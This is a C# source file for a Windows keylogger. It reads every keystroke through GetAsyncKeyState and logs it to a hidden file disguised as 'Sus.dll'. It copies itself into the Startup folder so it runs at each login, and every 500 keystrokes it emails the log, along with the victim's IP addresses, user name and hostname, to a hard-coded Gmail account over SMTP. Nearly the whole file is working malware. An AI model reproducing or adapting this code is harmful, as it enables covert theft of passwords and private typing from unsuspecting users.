using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using static System.Net.Mime.MediaTypeNames;

namespace KeyLogger
{
    class Program
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystrokes = 0;

        static void Main(string[] args)
        {
            Copyitself();
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\Sus.dll");
            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            while(true)
            {
                // pause and let other programs get a chance to run
                Thread.Sleep(5);

                // check all keys for their state
                for (int i = 32; i < 180; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        // 160 shift, 162 ctrl, 164 leftalt, win 91, 161 rightshift, 165 rightalt, 46 delete, 44 printscreen, f1 112, f12 123, 32 space, 8 backspace
                        // 144 numlock, 96 numpad0, 105 numpad9, numpad/ 111, numpad* 106, numpad- 109, numpad+ 107, numpad. 110, numlock 144, LArrow 37, UpArrow 38, RArrow 39, DownArrow 40
                        /*if(i == 46)
                        {
                            Console.Write("DeleteButton");
                        }
                        if(i == 44)
                        {
                            Console.Write("Printscreen");
                        }
                        if(i == 37)
                        {
                            Console.Write("LArrow");
                        }
                        if(i == 38)
                        {
                            Console.Write("UpArrow");
                        }
                        if(i == 39)
                        {
                            Console.Write("RArrow");
                        }
                        if(i == 40)
                        {
                            Console.Write("DownArrow");
                        }

                        if (i == 144)
                        {
                            Console.Write("NumLock");
                        }
                        if (i == 96)
                        {
                            Console.Write("numpad0");
                        }
                        if (i == 97)
                        {
                            Console.Write("numpad1");
                        }
                        if (i == 98)
                        {
                            Console.Write("numpad2");
                        }
                        if (i == 99)
                        {
                            Console.Write("numpad3");
                        }
                        if (i == 100)
                        {
                            Console.Write("numpad4");
                        }
                        if (i == 101)
                        {
                            Console.Write("numpad5");
                        }
                        if (i == 102)
                        {
                            Console.Write("numpad6");
                        }
                        if (i == 103)
                        {
                            Console.Write("numpad7");
                        }
                        if (i == 104)
                        {
                            Console.Write("numpad8");
                        }
                        if (i == 105)
                        {
                            Console.Write("numpad9");
                        }
                        if (i == 111)
                        {
                            Console.Write("numpad/");
                        }
                        if (i == 106)
                        {
                            Console.Write("numpad*");
                        }
                        if (i == 109)
                        {
                            Console.Write("numpad-");
                        }
                        if (i == 107)
                        {
                            Console.Write("numpad+");
                        }
                        if (i == 110)
                        {
                            Console.Write("numpadDel");
                        }

                        if (i == 112)
                        {
                            Console.Write("F1Key");
                        }
                        if (i == 113)
                        {
                            Console.Write("F2Key");
                        }
                        if (i == 114)
                        {
                            Console.Write("F3Key");
                        }
                        if (i == 115)
                        {
                            Console.Write("F4Key");
                        }
                        if (i == 116)
                        {
                            Console.Write("F5Key");
                        }
                        if (i == 117)
                        {
                            Console.Write("F6Key");
                        }
                        if (i == 118)
                        {
                            Console.Write("F7Key");
                        }
                        if (i == 119)
                        {
                            Console.Write("F8Key");
                        }
                        if (i == 120)
                        {
                            Console.Write("F9Key");
                        }
                        if (i == 121)
                        {
                            Console.Write("F10Key");
                        }
                        if (i == 122)
                        {
                            Console.Write("F11Key");
                        }
                        if (i == 123)
                        {
                            Console.Write("F12Key");
                        }
                        if (i == 160)
                        {
                            Console.Write("LShift");
                        }
                        if(i == 161)
                        {
                            Console.Write("RShift");
                        }
                        if(i == 162)
                        {
                            Console.Write("LCtrl");
                        }
                        if(i == 163)
                        {
                            Console.Write("RCtrl");
                        }
                        if(i == 164)
                        {
                            Console.Write("LAlt");
                        }
                        if(i == 165)
                        {
                            Console.Write("RAlt");
                        }
                        if(i == 91)
                        {
                            Console.Write("WinKey");
                        }*/
                        // print letters
                        Console.Write((char) i + ", ");
                        // write to file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeystrokes++;

                        if(numberOfKeystrokes % 500 == 0)
                        {
                            // send limited chars %n n = charcount
                            SendNewMessage();
                        }

                        
                    }
                }



            }
        } // main

        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\Sus.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            // create an email
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\" + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString() +"\n";
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("susrock69420@gmail.com");
            mailMessage.To.Add("susrock69420@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            // email and password
            client.Credentials = new NetworkCredential("susrock69420@gmail.com", "password");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }

        public static void Copyitself() // Program copies itself to windows autorun
        {

            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
            string thisFile1 = System.AppDomain.CurrentDomain.FriendlyName;
            string thisFile2 = System.AppDomain.CurrentDomain.FriendlyName;

            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile + ".exe";
            string Path1 = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile1 + ".runtimeconfig" + ".json";
            string Path2 = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile2 + ".dll";

            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe";
            string Filepath1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile1 + ".runtimeconfig" + ".json";
            string Filepath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile2 + ".dll";

            try
            {

                //COPY THIS PROGRAM TO STARTUP
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe") 
                    && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile1 + ".runtimeconfig" + ".json") 
                    && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile2 + ".dll"))
                {
                    File.Copy(Path, Filepath);
                    File.Copy(Path1, Filepath1);
                    File.Copy(Path2, Filepath2);
                    //File.SetAttributes(Filepath, File.GetAttributes(Filepath) | FileAttributes.Hidden);
                    //File.SetAttributes(Filepath1, File.GetAttributes(Filepath1) | FileAttributes.Hidden);
                    //File.SetAttributes(Filepath2, File.GetAttributes(Filepath2) | FileAttributes.Hidden);
                }

            }
            catch (Exception e)
            {

            }

        }
    }
}
